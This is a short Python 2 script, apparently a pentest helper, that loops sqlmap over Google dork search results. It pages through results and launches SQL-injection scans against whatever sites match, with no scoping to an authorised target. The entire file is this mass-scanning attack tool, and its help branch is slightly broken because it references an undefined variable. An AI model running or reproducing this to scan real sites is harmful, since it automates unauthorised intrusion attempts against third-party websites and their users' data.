#!/usr/bin/python
#by litsand

import os
import sys
if len(sys.argv) < 2:
    print 'use -help for more information'
    sys.exit()
if sys.argv[1].startswith('-'):
    option = sys.argv[1][1:]
    if option == 'help':
        print '''Usage:
        -g google dork.it will use this dork to test.and when it finished.it
        will increase the gpage argument and start sqlmap.py again'''
    elif option == 'g':
        dork = sys.argv[2]
        print dork
    else:
        print 'Unknow option'
        sys.exit()
    
cmd = 'python /pentest/database/sqlmap/sqlmap.py'
gpage = 1
print dork
while True:
    cmd1 = (cmd + ' -gpage=%d' + ' -g %s' + ' -c /pentest/database/sqlmap/auto.conf') % (gpage,dork)
    print cmd1
    result = os.system(cmd1)
    if result == 0:
        print result
        gpage +=5

    